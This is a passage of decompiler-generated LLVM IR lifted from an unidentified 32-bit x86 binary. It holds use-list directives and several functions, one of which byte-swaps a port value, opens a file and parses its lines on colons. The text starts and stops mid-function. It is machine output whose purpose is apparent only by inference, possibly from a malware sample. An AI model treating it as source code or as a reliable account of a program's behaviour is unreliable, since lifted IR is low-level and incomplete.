  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 31, 7, 27, 28, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 176, 177, 18, 23, 24, 19, 20, 21, 22, 25, 26, 29, 32, 37, 33, 34, 35, 36, 38, 39, 40, 41, 42, 43, 100, 101, 102, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 91, 88, 89, 90, 86, 92, 93, 94, 95, 96, 97, 98, 99, 152, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 164, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 165, 166, 167, 168, 169, 170, 171, 173, 172, 30, 174, 175 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 19, 20, 7, 8, 9, 10, 11, 116, 117, 118, 119, 120, 12, 13, 17, 18, 14, 28, 15, 16, 21, 22, 23, 24, 30, 56, 57, 25, 26, 27, 29, 31, 32, 33, 34, 35, 36, 39, 40, 37, 38, 41, 42, 43, 44, 45, 46, 47, 48, 49, 51, 52, 50, 53, 54, 55, 105, 106, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 107, 108, 109, 110, 111, 112, 113, 114, 115, 121 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 27, 28, 29, 30, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 20, 21, 22, 23, 24, 25, 440, 15, 16, 17, 18, 19, 26, 27, 28, 29, 30, 31, 32, 33, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 499, 500, 501, 502, 34, 35, 36, 37, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 81, 80, 83, 82, 84, 85, 86, 87, 88, 89, 90, 91, 92, 94, 95, 96, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 129, 130, 142, 143, 131, 132, 133, 134, 145, 135, 136, 137, 138, 139, 140, 141, 144, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 189, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 179, 178, 180, 181, 182, 183, 184, 185, 186, 187, 188, 190, 191, 192, 193, 194, 195, 200, 201, 196, 197, 198, 199, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 239, 240, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 241, 242, 243, 244, 246, 247, 245, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 267, 268, 272, 273, 269, 270, 271, 265, 266, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 412, 413, 417, 414, 415, 416, 418, 419, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 460, 461, 462, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 435, 436, 433, 434, 437, 438, 439, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 488, 455, 456, 457, 458, 459, 489, 490, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 482, 483, 480, 481, 97, 93, 484, 485, 486, 487, 491, 492, 493, 494, 495, 496, 497, 498 }
  uselistorder i32 ()* @function_804f660, { 19, 18, 17, 16, 15, 14, 2, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 ()* @function_805021e, { 3, 2, 1, 0 }
  uselistorder i32 147, { 0, 7, 8, 9, 1, 10, 11, 12, 2, 13, 26, 3, 14, 15, 16, 4, 17, 18, 19, 5, 20, 21, 22, 23, 24, 27, 6, 25 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 20740, { 1, 2, 3, 4, 0 }
  uselistorder i32 -20, { 1, 0, 2 }
  uselistorder i32 20612, { 1, 2, 0, 3 }
  uselistorder i32 10388, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 20900, { 4, 5, 6, 7, 8, 0, 3, 2, 9, 10, 11, 12, 1, 13, 14, 15, 16 }
  uselistorder i32 20916, { 2, 0, 15, 3, 4, 10, 8, 14, 13, 1, 16, 7, 17, 11, 5, 12, 6, 9, 18, 19, 20, 21 }
  uselistorder i8 47, { 0, 1, 3, 4, 2, 5, 7, 6 }
  uselistorder i32 3140, { 1, 2, 3, 4, 0 }
  uselistorder i32 -28, { 2, 3, 0, 1 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_8052474.5 to i32), { 1, 0 }
  uselistorder i32 134554646, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_8049f6a, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8049ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8049e86, { 1, 0 }
  uselistorder label %dec_label_pc_8049d1e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049ce8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049bbc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8049b86, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8049b6c, { 1, 0 }
  uselistorder label %dec_label_pc_8049b32, { 1, 0 }
  uselistorder label %dec_label_pc_8049ab4, { 1, 0 }
  uselistorder label %dec_label_pc_8049a49, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049a11, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80499f3, { 1, 0 }
  uselistorder label %dec_label_pc_80499d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80499c3, { 1, 0 }
  uselistorder label %dec_label_pc_804994e, { 1, 0 }
  uselistorder label %dec_label_pc_8049928, { 1, 0 }
  uselistorder label %dec_label_pc_80498ea, { 1, 0 }
  uselistorder label %dec_label_pc_80497f9, { 1, 0 }
  uselistorder label %dec_label_pc_804974f, { 1, 0 }
  uselistorder label %dec_label_pc_80496c3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80495d1, { 1, 0 }
  uselistorder label %dec_label_pc_804958e, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8049562, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049550, { 1, 0 }
  uselistorder label %dec_label_pc_80494dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804949f, { 1, 2, 5, 3, 4, 0 }
  uselistorder label %dec_label_pc_8049468, { 1, 0 }
  uselistorder label %dec_label_pc_804930a, { 1, 0 }
  uselistorder label %dec_label_pc_8049301, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80492e4, { 1, 0 }
  uselistorder label %dec_label_pc_80492b2, { 1, 0 }
  uselistorder label %dec_label_pc_8049289, { 1, 0 }
  uselistorder label %dec_label_pc_804924d, { 1, 0 }
  uselistorder label %dec_label_pc_80491db, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80491b6, { 1, 0 }
  uselistorder label %dec_label_pc_8049124, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80490e1, { 1, 0 }
  uselistorder label %dec_label_pc_8049044, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049001, { 1, 0 }
  uselistorder label %dec_label_pc_8048f64, { 1, 0 }
  uselistorder label %dec_label_pc_8048f33, { 1, 0 }
  uselistorder label %dec_label_pc_8048ee1, { 1, 0 }
  uselistorder label %dec_label_pc_8048e4a, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048db9, { 1, 0 }
  uselistorder label %dec_label_pc_8048d91, { 7, 15, 6, 1, 8, 2, 9, 10, 11, 14, 0, 12, 13, 5, 3, 4 }
  uselistorder label %dec_label_pc_8048d58, { 1, 0 }
  uselistorder label %dec_label_pc_8048c28, { 1, 0 }
  uselistorder label %dec_label_pc_8048c10, { 1, 0 }
  uselistorder label %dec_label_pc_8048bb4, { 1, 0 }
  uselistorder label %dec_label_pc_8048ad8, { 1, 0 }
  uselistorder label %dec_label_pc_8048700, { 1, 0 }
  uselistorder label %dec_label_pc_8048601, { 1, 0 }
  uselistorder label %dec_label_pc_80485be, { 1, 0 }
  uselistorder label %dec_label_pc_8048582, { 0, 1, 2, 3, 4, 7, 6, 5, 8 }
  uselistorder label %dec_label_pc_804855f, { 1, 0 }
  uselistorder label %dec_label_pc_80484e5, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_80484e5.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804848a, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_804841e, { 1, 0 }
  uselistorder label %dec_label_pc_80482cc, { 1, 0 }
  uselistorder label %dec_label_pc_80482b8, { 1, 0 }
  uselistorder label %dec_label_pc_804825d, { 1, 2, 0, 3, 4 }
}

define i32 @function_804a0a0(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a0a0:
  %tmp = trunc i32 %arg3 to i8
  %v4_804a0a5 = urem i32 %arg3, 256
  %v4_804a0b1 = zext i8 %arg1 to i32
  %v2_804a0b5 = icmp eq i8 %arg1, 0
  br i1 %v2_804a0b5, label %dec_label_pc_804a0e3, label %dec_label_pc_804a0c0

dec_label_pc_804a0c0:                             ; preds = %dec_label_pc_804a0a0
  %v3_804a0c4 = add i32 %arg2, 4
  %v4_804a0c4 = inttoptr i32 %v3_804a0c4 to i8*
  %v5_804a0c4 = load i8, i8* %v4_804a0c4, align 1
  %v16_804a0c4 = icmp eq i8 %tmp, %v5_804a0c4
  br i1 %v16_804a0c4, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0c9

dec_label_pc_804a0c9:                             ; preds = %dec_label_pc_804a0c0
  br label %dec_label_pc_804a0de

dec_label_pc_804a0d0:                             ; preds = %dec_label_pc_804a0de
  %v1_804a0d0 = add i32 %v0_804a0d3.in, 12
  %v2_804a0d0 = inttoptr i32 %v1_804a0d0 to i8*
  %v3_804a0d0 = load i8, i8* %v2_804a0d0, align 1
  %v4_804a0d0 = zext i8 %v3_804a0d0 to i32
  %v6_804a0d0 = and i32 %v5_804a0d0, -256
  %v7_804a0d0 = or i32 %v4_804a0d0, %v6_804a0d0
  %v16_804a0d8 = icmp eq i8 %v3_804a0d0, %tmp
  br i1 %v16_804a0d8, label %dec_label_pc_804a0eb, label %dec_label_pc_804a0de

dec_label_pc_804a0de:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c9
  %v5_804a0d0 = phi i32 [ %v7_804a0d0, %dec_label_pc_804a0d0 ], [ %v4_804a0a5, %dec_label_pc_804a0c9 ]
  %v0_804a0d3.in = phi i32 [ %v0_804a0d3, %dec_label_pc_804a0d0 ], [ %arg2, %dec_label_pc_804a0c9 ]
  %v0_804a0de = phi i32 [ %v1_804a0de, %dec_label_pc_804a0d0 ], [ 0, %dec_label_pc_804a0c9 ]
  %v0_804a0d3 = add i32 %v0_804a0d3.in, 8
  %v1_804a0de = add i32 %v0_804a0de, 1
  store i32 %v1_804a0de, i32* @ecx, align 4
  %v12_804a0df = icmp eq i32 %v1_804a0de, %v4_804a0b1
  %v1_804a0e1 = icmp eq i1 %v12_804a0df, false
  br i1 %v1_804a0e1, label %dec_label_pc_804a0d0, label %dec_label_pc_804a0e3

dec_label_pc_804a0e3:                             ; preds = %dec_label_pc_804a0de, %dec_label_pc_804a0a0
  ret i32 %arg4

dec_label_pc_804a0eb:                             ; preds = %dec_label_pc_804a0d0, %dec_label_pc_804a0c0
  %v0_804a0eb = phi i32 [ %arg2, %dec_label_pc_804a0c0 ], [ %v0_804a0d3, %dec_label_pc_804a0d0 ]
  %v1_804a0eb = inttoptr i32 %v0_804a0eb to i32*
  %v2_804a0eb = load i32, i32* %v1_804a0eb, align 4
  ret i32 %v2_804a0eb

; uselistorder directives
  uselistorder i32 %v1_804a0de, { 0, 2, 1 }
  uselistorder i32 %v0_804a0d3.in, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
}

define i32 @function_804a4b0(i8 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804a4b0:
  %v0_804a4b0 = load i32, i32* @edi, align 4
  %v0_804a4b1 = load i32, i32* @esi, align 4
  %v0_804a4b2 = load i32, i32* @ebx, align 4
  %v4_804a4b6 = zext i8 %arg1 to i32
  %v2_804a4be = icmp eq i8 %arg1, 0
  %v4_804a4c8 = urem i32 %arg3, 256
  %v5_804a4c8 = load i32, i32* @eax, align 4
  %v6_804a4c8 = and i32 %v5_804a4c8, -256
  %v7_804a4c8 = or i32 %v6_804a4c8, %v4_804a4c8
  br i1 %v2_804a4be, label %dec_label_pc_804a4f5, label %dec_label_pc_804a4d2

dec_label_pc_804a4d2:                             ; preds = %dec_label_pc_804a4b0
  %v1_804a4d2 = trunc i32 %arg3 to i8
  %v3_804a4d6 = add i32 %arg2, 4
  %v4_804a4d6 = inttoptr i32 %v3_804a4d6 to i8*
  %v5_804a4d6 = load i8, i8* %v4_804a4d6, align 1
  %v16_804a4d6 = icmp eq i8 %v1_804a4d2, %v5_804a4d6
  br i1 %v16_804a4d6, label %dec_label_pc_804a4fc, label %dec_label_pc_804a4db

dec_label_pc_804a4db:                             ; preds = %dec_label_pc_804a4d2
  br label %dec_label_pc_804a4f0

dec_label_pc_804a4e2:                             ; preds = %dec_label_pc_804a4f0
  %v1_804a4e2 = add i32 %v0_804a4e5.in, 12
  %v2_804a4e2 = inttoptr i32 %v1_804a4e2 to i8*
  %v3_804a4e2 = load i8, i8* %v2_804a4e2, align 1
  %v4_804a4e2 = zext i8 %v3_804a4e2 to i32
  %v6_804a4e2 = and i32 %v5_804a4e2, -256
  %v7_804a4e2 = or i32 %v4_804a4e2, %v6_804a4e2
  %v16_804a4ea = icmp eq i8 %v1_804a4d2, %v3_804a4e2
  br i1 %v16_804a4ea, label %dec_label_pc_804a4fc, label %dec_label_pc_804a4f0

dec_label_pc_804a4f0:                             ; preds = %dec_label_pc_804a4e2, %dec_label_pc_804a4db
  %v5_804a4e2 = phi i32 [ %v7_804a4e2, %dec_label_pc_804a4e2 ], [ %v7_804a4c8, %dec_label_pc_804a4db ]
  %v0_804a4e5.in = phi i32 [ %v0_804a4e5, %dec_label_pc_804a4e2 ], [ %arg2, %dec_label_pc_804a4db ]
  %v0_804a4f0 = phi i32 [ %v1_804a4f0, %dec_label_pc_804a4e2 ], [ 0, %dec_label_pc_804a4db ]
  %v0_804a4e5 = add i32 %v0_804a4e5.in, 8
  %v1_804a4f0 = add i32 %v0_804a4f0, 1
  store i32 %v1_804a4f0, i32* @ecx, align 4
  %v12_804a4f1 = icmp eq i32 %v4_804a4b6, %v1_804a4f0
  %v1_804a4f3 = icmp eq i1 %v12_804a4f1, false
  br i1 %v1_804a4f3, label %dec_label_pc_804a4e2, label %dec_label_pc_804a4f5

dec_label_pc_804a4f5:                             ; preds = %dec_label_pc_804a4f0, %dec_label_pc_804a4fc, %dec_label_pc_804a4b0
  store i32 %v0_804a4b2, i32* @ebx, align 4
  store i32 %v0_804a4b1, i32* @esi, align 4
  store i32 %v0_804a4b0, i32* @edi, align 4
  ret i32 %arg4

dec_label_pc_804a4fc:                             ; preds = %dec_label_pc_804a4e2, %dec_label_pc_804a4d2
  %v0_804a4fc = phi i32 [ %arg2, %dec_label_pc_804a4d2 ], [ %v0_804a4e5, %dec_label_pc_804a4e2 ]
  %v1_804a4fc = inttoptr i32 %v0_804a4fc to i32*
  %v2_804a4fc = load i32, i32* %v1_804a4fc, align 4
  %sext = mul i32 %v2_804a4fc, 16777216
  %v2_804a4fe = icmp eq i32 %sext, 0
  br i1 %v2_804a4fe, label %dec_label_pc_804a4f5, label %dec_label_pc_804a502

dec_label_pc_804a502:                             ; preds = %dec_label_pc_804a4fc
  store i32 %v0_804a4b2, i32* @ebx, align 4
  store i32 %v0_804a4b1, i32* @esi, align 4
  store i32 %v0_804a4b0, i32* @edi, align 4
  %v2_804a512 = sdiv i32 %sext, 16777216
  %v3_804a512 = inttoptr i32 %v2_804a512 to i8*
  %v4_804a512 = call i32 @function_804f6b0(i8* %v3_804a512, i32 10)
  ret i32 %v4_804a512

; uselistorder directives
  uselistorder i32 %v1_804a4f0, { 0, 2, 1 }
  uselistorder i32 %v0_804a4e5.in, { 1, 0 }
  uselistorder i32 %v0_804a4b2, { 1, 0 }
  uselistorder i32 %v0_804a4b1, { 1, 0 }
  uselistorder i32 %v0_804a4b0, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804a4f5, { 1, 0, 2 }
}

define i32 @function_804ca10(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ca10:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i8 @__decompiler_undefined_function_3()
  %tmp51 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-4657 = alloca i32, align 4
  %stack_var_-8753 = alloca i32, align 4
  %stack_var_-8796 = alloca i8*, align 4
  %stack_var_-561 = alloca i8, align 1
  %stack_var_-8780 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ca10 = load i32, i32* @ebp, align 4
  %v0_804ca11 = load i32, i32* @edi, align 4
  %v0_804ca12 = load i32, i32* @esi, align 4
  %v0_804ca13 = load i32, i32* @ebx, align 4
  store i32 %v0_804ca13, i32* %stack_var_-16, align 4
  %v15_804ca14 = ptrtoint i32* %stack_var_-8780 to i32
  %v2_804ca1a = ptrtoint i8* %stack_var_-561 to i32
  store i32 %v2_804ca1a, i32* @edi, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v5_804ca5d = call i32 @function_80500da(i8* nonnull %stack_var_-561, i32 0, i32 513)
  %v1_804ca65 = trunc i32 %arg1 to i16
  %v2_804ca65 = call i16 @llvm.bswap.i16(i16 %v1_804ca65)
  %v3_804ca65 = zext i16 %v2_804ca65 to i32
  %v2_804ca70 = ptrtoint i32* %stack_var_-8753 to i32
  store i32 %v2_804ca70, i32* %eax.global-to-local, align 4
  store i32 %v3_804ca65, i32* @ebx, align 4
  %tmp71 = bitcast i32* %stack_var_-8753 to i8*
  store i8* %tmp71, i8** %stack_var_-8796, align 4
  %v5_804ca7b = call i32 @function_80500da(i8* %tmp71, i32 0, i32 4096)
  store i32 %v5_804ca7b, i32* %eax.global-to-local, align 4
  %v2_804ca8a = ptrtoint i32* %stack_var_-4657 to i32
  store i32 %v2_804ca8a, i32* %edx.global-to-local, align 4
  %tmp72 = bitcast i32* %stack_var_-4657 to i8*
  store i8* %tmp72, i8** %stack_var_-8796, align 4
  %v5_804ca92 = call i32 @function_80500da(i8* %tmp72, i32 0, i32 4096)
  %v2_804ca9a = ptrtoint i8* %stack_var_-48 to i32
  store i32 %v2_804ca9a, i32* %eax.global-to-local, align 4
  %v0_804caa4 = load i32, i32* @ebx, align 4
  %v5_804caa4 = inttoptr i32 %v0_804caa4 to i8*
  store i8* %v5_804caa4, i8** %stack_var_-8796, align 4
  %v4_804caa5 = sext i32 %v0_804caa4 to i64
  %v5_804caa5 = call i32 @function_804f9c0(i64 %v4_804caa5, i32 16, i32 %v2_804ca9a)
  store i32 %v5_804caa5, i32* %eax.global-to-local, align 4
  store i32 %v2_804ca9a, i32* %edx.global-to-local, align 4
  store i8* %stack_var_-48, i8** %stack_var_-8796, align 4
  %v3_804cab3 = call i32 @function_804f5b0(i8* nonnull %stack_var_-48)
  store i32 %v3_804cab3, i32* %eax.global-to-local, align 4
  %v9_804cabb = icmp eq i32 %v3_804cab3, 2
  br i1 %v9_804cabb, label %dec_label_pc_804cfe5, label %dec_label_pc_804cac4

dec_label_pc_804cac4:                             ; preds = %dec_label_pc_804ca10, %dec_label_pc_804cfe5
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804cacb = call i32 @function_804ec60(i8 6)
  store i32 %v3_804cacb, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804cad7 = call i32 @function_804ec60(i8 7)
  store i32 %v3_804cad7, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804cae3 = call i32 @function_804ec60(i8 9)
  %v2_804cae8 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804cae8 = ptrtoint i8* %v2_804cae8 to i32
  store i32 %v3_804cae8, i32* %eax.global-to-local, align 4
  store i32 16, i32* %edx.global-to-local, align 4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80524b0.20, i32 0, i32 0), i8** %stack_var_-8796, align 4
  %v4_804caf1 = call i32 @function_804fc62(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80524b0.20, i32 0, i32 0), i32 0)
  store i32 %v4_804caf1, i32* @eax, align 4
  store i32 %v4_804caf1, i32* @ebp, align 4
  %v10_804cafb = icmp eq i32 %v4_804caf1, -1
  br i1 %v10_804cafb, label %dec_label_pc_804cf7e, label %dec_label_pc_804cb04.outer.preheader

dec_label_pc_804cb04.outer.preheader:             ; preds = %dec_label_pc_804cac4
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804cb0c9095 = call i32 @function_804f7d0(i32 %v2_804ca1a, i32 512, i32 %v4_804caf1)
  store i32 %v4_804cb0c9095, i32* %eax.global-to-local, align 4
  %v1_804cb149196 = icmp eq i32 %v4_804cb0c9095, 0
  br i1 %v1_804cb149196, label %dec_label_pc_804cc3b.loopexit, label %dec_label_pc_804cb1c.lr.ph.lr.ph

dec_label_pc_804cb1c.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804cb04.outer.preheader
  %v2_804cb48 = add i32 %v15_804ca14, 8221
  %v2_804cb74 = add i32 %v15_804ca14, 8219
  br label %dec_label_pc_804cb1c.lr.ph

dec_label_pc_804cb1c:                             ; preds = %dec_label_pc_804cb1c.lr.ph, %dec_label_pc_804cb04.backedge
  %v4_804cb0c92 = phi i32 [ %v4_804cb0c9098, %dec_label_pc_804cb1c.lr.ph ], [ %v4_804cb0c, %dec_label_pc_804cb04.backedge ]
  %v3_804cb1c = load i8, i8* %stack_var_-561, align 1
  %v4_804cb1c = sext i8 %v3_804cb1c to i32
  %v7_804cb1c = and i32 %v4_804cb0c92, -256
  %v8_804cb1c = or i32 %v4_804cb1c, %v7_804cb1c
  store i32 %v8_804cb1c, i32* @eax, align 4
  %v4_804cb23 = icmp eq i8 %v3_804cb1c, 0
  br i1 %v4_804cb23, label %dec_label_pc_804cf47, label %dec_label_pc_804cb2b

dec_label_pc_804cb2b:                             ; preds = %dec_label_pc_804cb1c
  store i32 0, i32* %edx.global-to-local, align 4
  %v10_804cb2d = icmp eq i8 %v3_804cb1c, 58
  br i1 %v10_804cb2d, label %dec_label_pc_804cf47, label %dec_label_pc_804cb35.preheader

dec_label_pc_804cb35.preheader:                   ; preds = %dec_label_pc_804cb2b
  %v1_804cb36.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804cb35

dec_label_pc_804cb35:                             ; preds = %dec_label_pc_804cb35.preheader, %dec_label_pc_804cb3d
  %v6_804cb36 = phi i32 [ %v8_804cb1c, %dec_label_pc_804cb35.preheader ], [ %v8_804cb36, %dec_label_pc_804cb3d ]
  %v0_804cb35 = phi i32 [ 0, %dec_label_pc_804cb35.preheader ], [ %v1_804cb35, %dec_label_pc_804cb3d ]
  %v1_804cb35 = add i32 %v0_804cb35, 1
  store i32 %v1_804cb35, i32* %edx.global-to-local, align 4
  %v2_804cb36 = add i32 %v1_804cb35, %v1_804cb36.pre
  %v3_804cb36 = inttoptr i32 %v2_804cb36 to i8*
  %v4_804cb36 = load i8, i8* %v3_804cb36, align 1
  %v5_804cb36 = zext i8 %v4_804cb36 to i32
  %v7_804cb36 = and i32 %v6_804cb36, -256
  %v8_804cb36 = or i32 %v5_804cb36, %v7_804cb36
  store i32 %v8_804cb36, i32* @eax, align 4
  %v4_804cb39 = icmp eq i8 %v4_804cb36, 0
  br i1 %v4_804cb39, label %dec_label_pc_804cb04.backedge, label %dec_label_pc_804cb3d

dec_label_pc_804cb3d:                             ; preds = %dec_label_pc_804cb35
  %v10_804cb3d = icmp eq i8 %v4_804cb36, 58
  %v1_804cb3f = icmp eq i1 %v10_804cb3d, false
  br i1 %v1_804cb3f, label %dec_label_pc_804cb35, label %dec_label_pc_804cb41

dec_label_pc_804cb41:                             ; preds = %dec_label_pc_804cb3d, %dec_label_pc_804cf47
  %v1_804cb5f = phi i32 [ 0, %dec_label_pc_804cf47 ], [ %v1_804cb35, %dec_label_pc_804cb3d ]
  %v7_804cb48 = phi i32 [ %v8_804cb1c, %dec_label_pc_804cf47 ], [ %v8_804cb36, %dec_label_pc_804cb3d ]
  %v3_804cb41 = trunc i32 %v7_804cb48 to i8
  %v4_804cb41 = icmp eq i8 %v3_804cb41, 0
  br i1 %v4_804cb41, label %dec_label_pc_804cb04.backedge, label %dec_label_pc_804cb45

dec_label_pc_804cb04.backedge:                    ; preds = %dec_label_pc_804cb35, %dec_label_pc_804cb41, %dec_label_pc_804cb74
  %v0_804cb04.be = phi i32 [ %v7_804cb48, %dec_label_pc_804cb41 ], [ 0, %dec_label_pc_804cb74 ], [ %v8_804cb36, %dec_label_pc_804cb35 ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804cb0c = call i32 @function_804f7d0(i32 %v2_804ca1a, i32 512, i32 %v0_804cb04.be)
  store i32 %v4_804cb0c, i32* %eax.global-to-local, align 4
  %v1_804cb14 = icmp eq i32 %v4_804cb0c, 0
  br i1 %v1_804cb14, label %dec_label_pc_804cc3b.loopexit, label %dec_label_pc_804cb1c

dec_label_pc_804cb45:                             ; preds = %dec_label_pc_804cb41
  %v1_804cb45 = add i32 %v1_804cb5f, 2
  store i32 %v1_804cb45, i32* @ecx, align 4
  %v3_804cb48 = add i32 %v2_804cb48, %v1_804cb5f
  %v4_804cb48 = inttoptr i32 %v3_804cb48 to i8*
  %v5_804cb48 = load i8, i8* %v4_804cb48, align 1
  %v6_804cb48 = zext i8 %v5_804cb48 to i32
  %v8_804cb48 = and i32 %v7_804cb48, -256
  %v9_804cb48 = or i32 %v6_804cb48, %v8_804cb48
  store i32 %v9_804cb48, i32* %eax.global-to-local, align 4
  %v4_804cb4f = icmp eq i8 %v5_804cb48, 0
  br i1 %v4_804cb4f, label %dec_label_pc_804cb74, label %dec_label_pc_804cb57

dec_label_pc_804cb57:                             ; preds = %dec_label_pc_804cb45
  %v7_804cb57 = icmp eq i8 %v5_804cb48, 32
  br i1 %v7_804cb57, label %dec_label_pc_804cb74, label %dec_label_pc_804cb5f

dec_label_pc_804cb5f:                             ; preds = %dec_label_pc_804cb57
  %v0_804cb5f = load i32, i32* @edi, align 4
  %v2_804cb5f = add i32 %v0_804cb5f, %v1_804cb5f
  store i32 %v2_804cb5f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cb62

dec_label_pc_804cb62:                             ; preds = %dec_label_pc_804cb6a, %dec_label_pc_804cb5f
